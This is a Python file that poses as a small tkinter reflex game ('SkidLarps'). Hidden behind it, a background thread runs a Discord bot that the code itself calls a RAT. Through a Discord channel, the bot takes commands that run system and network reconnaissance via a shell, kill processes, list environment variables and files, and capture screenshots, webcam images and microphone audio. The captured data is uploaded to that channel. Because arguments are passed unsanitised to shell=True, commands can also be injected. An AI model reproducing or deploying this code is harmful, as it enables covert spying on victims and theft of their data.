import tkinter as tk
import threading
import subprocess
import discord
import math
import time
from PIL import ImageGrab 
import cv2                  
import os
import asyncio
import sounddevice as sd
from scipy.io.wavfile import write
import tempfile
import random
import signal

DISCORD_BOT_TOKEN = "Place_Bot_Token_Here"
DISCORD_CHANNEL_ID = Place_Channel_ID_Here
AUTHORIZED = True  
CREATOR_NAME = "(Skid Larp / MrMolly4)"
ALLOWED_COMMANDS = {
    "ipconfig": "ipconfig",
    "hostname": "hostname",
    "systeminfo": "systeminfo",
    "uptime": "net stats workstation",
    "whoami": "whoami",
    "date": "date /t",
    "time": "time /t",
    "tasklist": "tasklist",
    "taskkill": "taskkill /PID", 
    "services": "net start",
    "netstat": "netstat -ano",
    "arp": "arp -a",
    "route": "route print",
    "ping": "ping",               
    "tracert": "tracert",        
    "drives": "wmic logicaldisk get name,freespace,size",
    "dir": "dir",                
    "pwd": "cd",
    "env": "set",
    "echo": "echo",               
    "clear": "cls"
}
MEDIA_COMMANDS = {
    "screenshot": "screenshot",
    "webcamshot": "webcamshot",
    "mic_test": "mic_test"
}
root = tk.Tk()
root.title("SkidLarps")
root.geometry("420x520")
root.resizable(False, False)
DARK_MODE = True
game_running = False
angle = 0
rotation_speed = 2
score = 0
time_left = 40
target = None
canvas = tk.Canvas(root, width=300, height=300, highlightthickness=0)
canvas.pack(pady=20)
clock_label = tk.Label(root, font=("Segoe UI", 16, "bold"))
clock_label.pack()
score_label = tk.Label(root, font=("Segoe UI", 12, "bold"))
score_label.pack()
timer_label = tk.Label(root, font=("Segoe UI", 12, "bold"))
timer_label.pack()
def apply_theme():
    bg = "#000000" if DARK_MODE else "#f5f5f5"
    fg = "#ffffff" if DARK_MODE else "#000000"
    root.configure(bg=bg)
    canvas.configure(bg=bg)
    for lbl in (clock_label, score_label, timer_label):
        lbl.configure(bg=bg, fg=fg)
    mode_btn.configure(bg=fg, fg=bg)
    start_btn.configure(bg=fg, fg=bg)
def toggle_mode():
    global DARK_MODE
    DARK_MODE = not DARK_MODE
    apply_theme()
mode_btn = tk.Button(root, text="Light / Dark Mode", command=toggle_mode)
mode_btn.pack(pady=5)
def start_game():
    global game_running, score, time_left, rotation_speed
    if game_running:
        return  
    score = 0
    time_left = 40
    rotation_speed = 2
    game_running = True
    score_label.config(text="Score: 0")
    timer_label.config(text="Time: 40")
    spawn_target()
    countdown()
start_btn = tk.Button(root, text="Start Game", command=start_game)
start_btn.pack(pady=10)
def update_clock():
    clock_label.config(text=time.strftime("%I:%M:%S %p"))
    root.after(1000, update_clock)
outer_ring = canvas.create_oval(20, 20, 280, 280, width=2)
inner_ring = canvas.create_oval(50, 50, 250, 250, width=2)
dot = canvas.create_oval(145, 10, 155, 20)
def animate():
    global angle
    angle += rotation_speed
    rad = math.radians(angle)
    x = 150 + 120 * math.cos(rad)
    y = 150 + 120 * math.sin(rad)
    fg = "white" if DARK_MODE else "black"
    canvas.coords(dot, x-5, y-5, x+5, y+5)
    canvas.itemconfig(dot, fill=fg, outline=fg)
    canvas.itemconfig(outer_ring, outline=fg)
    canvas.itemconfig(inner_ring, outline=fg)
    root.after(40, animate)
def spawn_target():
    global target
    if target:
        canvas.delete(target)
    r = max(6, 12 - score // 5)
    x = random.randint(80, 220)
    y = random.randint(80, 220)
    color = "cyan" if DARK_MODE else "red"
    target = canvas.create_oval(x-r, y-r, x+r, y+r, fill=color, outline="")
    canvas.tag_bind(target, "<Button-1>", hit_target)
def hit_target(event):
    global score, rotation_speed
    if not game_running:
        return
    score += 1
    rotation_speed = min(8, rotation_speed + 0.2)
    score_label.config(text=f"Score: {score}")
    spawn_target()
def countdown():
    global time_left, game_running
    if not game_running:
        return
    time_left -= 1
    timer_label.config(text=f"Time: {time_left}")
    if time_left <= 0:
        game_running = False
        if target:
            canvas.delete(target)
        timer_label.config(text="Game Over")
        return
    root.after(1000, countdown)
apply_theme()
update_clock()
animate()
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
def chunk(text, size=1900):
    return [text[i:i+size] for i in range(0, len(text), size)]
async def run_media_command(cmd, mic_duration=10):
    """
    Runs media commands: screenshot, webcamshot, mic_test.
    Parameters:
        cmd (str): Command to run ("screenshot", "webcamshot", "mic_test")
        mic_duration (int): Duration in seconds for mic recording (default 10)
    """
    if cmd == "screenshot":
        screenshot = ImageGrab.grab()
        filename = "screenshot.png"
        screenshot.save(filename)
        return filename
    elif cmd == "webcamshot":
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "[No webcam detected.]"
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        ret, frame = cap.read()
        filename = "webcam.png"
        if ret:
            cv2.imwrite(filename, frame)
            cap.release()
            return f"[Webcam captured]: {filename}"
        else:
            cap.release()
            return "[Failed to capture webcam image.]"
    elif cmd == "mic_test":
        def record_audio(duration):
            fs = 44100  
            print(f"[Recording mic for] - {duration} (seconds)...")
            device_index = None  
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16', device=device_index)
            sd.wait()
            tmp_file = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
            write(tmp_file.name, fs, recording)
            tmp_file.close()
            print("[Playing back the recording]...")
            sd.play(recording, fs)
            sd.wait()
            return tmp_file.name
        loop = asyncio.get_running_loop()
        filename = await loop.run_in_executor(None, record_audio, mic_duration)
        return f"[Mic test completed. Recording saved to] - {filename}"
    else:
        return "[Unknown media command.]"
@client.event
async def on_ready():
    dot_art = r"""
 ▄▄▄▄▄▄▄               ▄▄   ▄▄▄                              
█████▀▀▀ ▄▄     ▀▀     ██   ███                              
 ▀████▄  ██ ▄█▀ ██  ▄████   ███       ▀▀█▄ ████▄ ████▄ ▄█▀▀▀ 
   ▀████ ████   ██  ██ ██   ███      ▄█▀██ ██ ▀▀ ██ ██ ▀███▄ 
███████▀ ██ ▀█▄ ██▄ ▀████   ████████ ▀█▄██ ██    ████▀ ▄▄▄█▀ 
                                                 ██          
  https://skd-v2.godaddysites.com/               ▀▀   
"""
    print(dot_art)
    print(f"[+] (Logged in as) {client.user}")
    try:
        channel = client.get_channel(DISCORD_CHANNEL_ID)
        if channel:
            await channel.send(f"```{dot_art}```\n**(SkidLarps RAT is now online! Logged in as)** `{client.user}`.")
        else:
            print("(Channel not found. Check DISCORD_CHANNEL_ID.)")
    except Exception as e:
        print(f"(Failed to send online message): {e}")
async def shutdown():
    print("\n[!] (Shutting down SkidLarps RAT)...")
    try:
        channel = client.get_channel(DISCORD_CHANNEL_ID)
        if channel:
            await channel.send(f"**[SkidLarps RAT is going offline!] Logged out as** `{client.user}`.")
    except Exception as e:
        print(f"[Failed to send offline message]: {e}")
    await client.close()
def handle_exit_signal():
    asyncio.create_task(shutdown())
signal.signal(signal.SIGINT, lambda s, f: handle_exit_signal())
signal.signal(signal.SIGTERM, lambda s, f: handle_exit_signal())
@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.channel.id != DISCORD_CHANNEL_ID:
        return
    if not AUTHORIZED:
        await message.channel.send("[authorization is OFF.]")
        return
    if not message.content.startswith("!"):
        return
    parts = message.content[1:].split()
    cmd = parts[0].lower()
    args = parts[1:]
    if cmd == "help":
     help_msg = (
    "╔═══════════════════════════╗\n"
    "║      Available Commands    \n"
    "╚═══════════════════════════╝\n\n"
    "`All commands below are useable`\n\n"
    "`except for [!drives] & [!mic_test]`\n\n"
    "`will be fixed soon..`\n\n"
    
    "╔═══════════════════════════╗\n"
    "║       System / Info        \n"
    "╚═══════════════════════════╝\n"
    "`!ipconfig`  `!hostname`  `!systeminfo`\n"
    "`!uptime`    `!whoami`    `!date`  `!time`\n\n"

    "╔═══════════════════════════╗\n"
    "║     Process / Tasks        \n"
    "╚═══════════════════════════╝\n"
    "`!tasklist`  `!taskkill <PID>`  `!services`\n\n"

    "╔═══════════════════════════╗\n"
    "║         Network            \n"
    "╚═══════════════════════════╝\n"
    "`!ping <host>`  `!tracert <host>`  `!netstat`\n"
    "`!arp`    `!route`\n\n"

    "╔═══════════════════════════╗\n"
    "║     Disk / File System     \n"
    "╚═══════════════════════════╝\n"
    "`!drives`  `!dir <path>`  `!pwd`\n\n"

    "╔═══════════════════════════╗\n"
    "║        Utility             \n"
    "╚═══════════════════════════╝\n"
    "`!env`  `!echo <text>`  `!clear`\n\n"

    "╔═══════════════════════════╗\n"
    "║     Media Commands         \n"
    "╚═══════════════════════════╝\n"
    "`!screenshot`  `!webcamshot`  `!mic_test`\n\n"

    "╔═══════════════════════════╗\n"
    "║       Creator              \n"
    "╚═══════════════════════════╝\n"
    "`!creator`\n"
)
     await message.channel.send(help_msg)
     return
    if cmd == "creator":
        await message.channel.send(f"**[SkidLarps RAT Created by] - {CREATOR_NAME}**")
        return
    if cmd in MEDIA_COMMANDS:
        result = await run_media_command(cmd)
        if os.path.exists(result):
            await message.channel.send(file=discord.File(result))
            os.remove(result)
        else:
            await message.channel.send(f"{result}")
        return
    if cmd not in ALLOWED_COMMANDS:
        await message.channel.send("[Command not allowed.]")
        return
    arg_required = ["ping", "tracert", "dir", "echo", "taskkill"]
    if cmd in arg_required and not args:
        await message.channel.send(f"`{cmd}` prequires arguments.]")
        return
    try:
        full_cmd = ALLOWED_COMMANDS[cmd]
        if args:
            full_cmd += " " + " ".join(args)
        output = subprocess.check_output(full_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        if not output.strip():
            output = "**[Command executed successfully]**"
        for part in chunk(output):
            await message.channel.send(f"```\n{part}\n```")
    except Exception as e:
        await message.channel.send(f"Error:\n```{e}```")

def start_discord():
    client.run(DISCORD_BOT_TOKEN)
threading.Thread(target=start_discord, daemon=True).start()

root.mainloop()
